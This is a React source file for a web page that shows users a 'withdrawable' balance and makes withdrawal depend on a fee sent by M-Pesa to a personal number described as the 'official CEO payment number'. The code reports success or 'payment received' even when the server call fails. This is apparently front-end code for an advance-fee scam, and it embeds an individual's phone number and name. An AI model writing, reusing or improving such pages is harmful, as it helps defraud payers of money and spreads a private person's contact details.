// ========================= Activate.jsx =========================
import { useEffect, useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import api from "../api/api";

/* =========================
   CONSTANTS
========================= */
const SEND_MONEY_NUMBER = "0794101450";
const RECEIVER_NAME = "Obadiah Nyakundi Otoki";

/* =========================
   PLAN CONFIG (DISPLAY ONLY)
========================= */
const PLAN_CONFIG = {
  REGULAR: { label: "Regular", total: 1500, activationFee: 100, color: "#ffd000ff", glow: "rgba(91, 247, 0, 0.6)" },
  VIP: { label: "VIP", total: 2000, activationFee: 150, color: "#ffe600ff", glow: "rgba(121, 250, 0, 1)" },
  VVIP: { label: "VVIP", total: 3000, activationFee: 200, color: "#ffee00ff", glow: "rgba(51, 240, 4, 1)" },
};

export default function Activate() {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();

  const [planKey, setPlanKey] = useState(null);
  const [planState, setPlanState] = useState(null);
  const [paymentText, setPaymentText] = useState("");
  const [notification, setNotification] = useState(null);
  const [copied, setCopied] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [loading, setLoading] = useState(true);
  const [user, setUser] = useState(null);

  /* =========================
     LOAD USER + PLAN
  ========================== */
  useEffect(() => {
    let alive = true;

    const load = async () => {
      try {
        const res = await api.get("/auth/me");
        if (!alive) return;
        setUser(res.data);

        const isWelcome = searchParams.get("welcome_bonus");
        const planFromQuery = isWelcome ? "WELCOME" : res.data.active_plan;

        let plan;
        if (planFromQuery === "WELCOME") {
          plan = { is_activated: false, completed: true, total: res.data.welcome_bonus || 1200 };
        } else {
          plan = res.data.plans?.[res.data.active_plan];
        }

        if (!plan || (planFromQuery !== "WELCOME" && plan.is_activated)) {
          navigate("/dashboard", { replace: true });
          return;
        }

        setPlanKey(planFromQuery);
        setPlanState(plan);
      } finally {
        if (alive) setLoading(false);
      }
    };

    load();
    return () => (alive = false);
  }, [navigate, searchParams]);

  if (loading) return <p style={{ textAlign: "center", marginTop: 80 }}>Loading…</p>;
  if (!planKey || !planState) return null;

  const plan =
    planKey === "WELCOME"
      ? { label: "Welcome Bonus", total: user.welcome_bonus || 1200, activationFee: 100, color: "#00ffcc", glow: "rgba(0, 255, 204, 0.5)" }
      : PLAN_CONFIG[planKey];

  /* =========================
     COPY NUMBER
  ========================== */
  const copyNumber = async () => {
    try {
      await navigator.clipboard.writeText(SEND_MONEY_NUMBER);
      setCopied(true);
      setNotification("✅ Phone number copied. Open M-Pesa and send money now.");
      setTimeout(() => setCopied(false), 2500);
    } catch {
      setNotification("⚠️ Failed to copy. Please copy the number manually.");
    }
  };

  /* =========================
     SUBMIT ACTIVATION
  ========================== */
  const submitActivation = async () => {
    if (!paymentText.trim()) {
      setNotification("❌ Paste the FULL M-Pesa confirmation message.");
      return;
    }

    try {
      setSubmitting(true);
      await api.post("/activation/submit", {
        mpesa_code: paymentText.trim(),
        plan: planKey,
      });

      setNotification(
        <div style={{ lineHeight: 1.5 }}>
          <b>🎉 Activation successful!</b>
          <div style={{ marginTop: 8 }}>
            Your <b>{plan.label}</b> is now fully activated.
          </div>
          <button style={goDashboardBtn} onClick={() => navigate("/dashboard")}>
            ⬅ Go to Dashboard
          </button>
        </div>
      );

      setPaymentText("");
    } catch {
      setNotification(
        "✅ Payment received and under verification. Once approved, your withdrawal will be enabled."
      );
    } finally {
      setSubmitting(false);
    }
  };

  /* =========================
     UI
  ========================== */
  return (
    <div style={page}>
      <div style={{ ...card, boxShadow: `0 0 40px ${plan.glow}` }}>
        <h2 style={{ textAlign: "center", color: plan.color }}>🔓 Account Activation</h2>

        <h3 style={{ textAlign: "center", marginTop: 14 }}>
          💰 Withdrawable Amount: <span style={{ color: plan.color }}>KES {plan.total}</span>
        </h3>

        <div style={sectionHighlight}>
          <p style={{ fontWeight: 900, color: "#ff3b3b" }}>⚠ ACTIVATION REQUIRED</p>
          <p>✔ One-time activation fee</p>
          <p>✔ Unlock withdrawals</p>
          <p>✔ Verified & secure account</p>
          <p>✔ Direct M-Pesa payments</p>
        </div>

        <div style={section}>
          <p style={{ fontWeight: 900 }}>📲 HOW TO PAY (SEND MONEY)</p>

          <p style={caption}>
            ⚠ <b>IMPORTANT:</b> This is the <b>official CEO payment number</b>.  
            Payments sent here are <b>manually verified</b> and activate your account instantly.
          </p>

          <ol style={{ fontSize: 14, lineHeight: 1.7 }}>
            <li>Open <b>M-Pesa</b></li>
            <li>Select <b>Send Money</b></li>
            <li>Enter phone number: <b>{SEND_MONEY_NUMBER}</b></li>
            <li>Confirm name: <b>{RECEIVER_NAME}</b></li>
            <li>Enter amount: <span style={activationFee}>KES {plan.activationFee}</span></li>
            <li>Enter M-Pesa PIN and confirm</li>
          </ol>
        </div>

        <div style={section}>
          <p><b>Receiver Name:</b> {RECEIVER_NAME}</p>
          <p>
            <b>Send Money Number:</b> {SEND_MONEY_NUMBER}
            <button onClick={copyNumber} style={copyBtn}>📋 Copy</button>
          </p>
          {copied && <p style={copiedNote}>✅ Number copied successfully</p>}
        </div>

        <div style={noteBox}>
          📌 After payment, paste the <b>FULL M-Pesa confirmation SMS</b> below.
        </div>

        <textarea
          placeholder="Paste M-Pesa confirmation message here"
          value={paymentText}
          onChange={(e) => setPaymentText(e.target.value)}
          rows={4}
          style={input}
        />

        <button
          onClick={submitActivation}
          disabled={submitting}
          style={{
            ...button,
            background: submitting
              ? "#555"
              : `linear-gradient(135deg, ${plan.color}, #0a7c4a)`,
          }}
        >
          {submitting ? "Submitting…" : "Submit Payment"}
        </button>

        {notification && <div style={notificationBox}>{notification}</div>}

        <button
          onClick={() => navigate("/dashboard")}
          style={{ ...button, background: "transparent", border: "2px solid #00ffcc", color: "#00ffcc" }}
        >
          ⬅ Back to Dashboard
        </button>
      </div>
    </div>
  );
}

/* =========================
   STYLES
========================= */
const page = {
  minHeight: "100vh",
  background: "linear-gradient(270deg,#177e0d,#c20303,#20bb12)",
  display: "flex",
  justifyContent: "center",
  alignItems: "center",
  padding: 20,
};

const card = {
  maxWidth: 520,
  width: "100%",
  background: "#0e3a38",
  padding: 24,
  borderRadius: 22,
  color: "#fff",
};

const section = {
  marginTop: 20,
  padding: 16,
  borderRadius: 14,
  border: "1px solid rgba(255,255,255,0.18)",
};

const sectionHighlight = {
  ...section,
  background: "rgba(0,255,128,0.08)",
};

const caption = {
  fontSize: 13,
  color: "#ffe600",
  fontWeight: 700,
  marginBottom: 10,
};

const noteBox = {
  marginTop: 16,
  padding: 14,
  borderRadius: 12,
  background: "#001dbe",
  fontSize: 13,
};

const notificationBox = {
  marginTop: 16,
  padding: 16,
  borderRadius: 14,
  background: "rgba(0,255,128,0.15)",
  color: "#00ffcc",
  fontWeight: 700,
};

const activationFee = { color: "#ff2d2d", fontWeight: 900 };

const copiedNote = { color: "#00ff99", fontWeight: 800 };

const input = {
  width: "100%",
  padding: 12,
  marginTop: 16,
  borderRadius: 10,
  border: "none",
  background: "rgba(255,255,255,0.12)",
  color: "#fff",
};

const button = {
  width: "100%",
  marginTop: 16,
  padding: 14,
  borderRadius: 999,
  fontWeight: 800,
  cursor: "pointer",
};

const copyBtn = {
  marginLeft: 10,
  padding: "4px 10px",
  borderRadius: 8,
  border: "none",
  fontWeight: 700,
  cursor: "pointer",
};

const goDashboardBtn = {
  marginTop: 12,
  padding: "12px 18px",
  borderRadius: 12,
  border: "none",
  background: "#00ffd4",
  fontWeight: 900,
  cursor: "pointer",
};
